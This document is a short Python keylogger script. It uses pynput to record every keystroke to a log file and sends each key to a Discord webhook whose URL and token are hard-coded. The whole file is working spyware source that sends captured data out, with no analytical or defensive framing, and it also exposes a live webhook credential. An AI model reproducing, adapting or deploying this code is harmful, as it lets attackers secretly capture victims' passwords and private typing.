from pynput.keyboard import Key, Listener
import logging
from dhooks import Webhook

log_send = Webhook('https://discord.com/api/webhooks/1159862596594323456/aF_df4_sBgZxL760mD9125AcTUfuqdfWu1d2MQIWzCOMx1JFWb75L3GtrxTyY1HDIgIk')

log_dir = "F:"

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))
    log_send.send(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

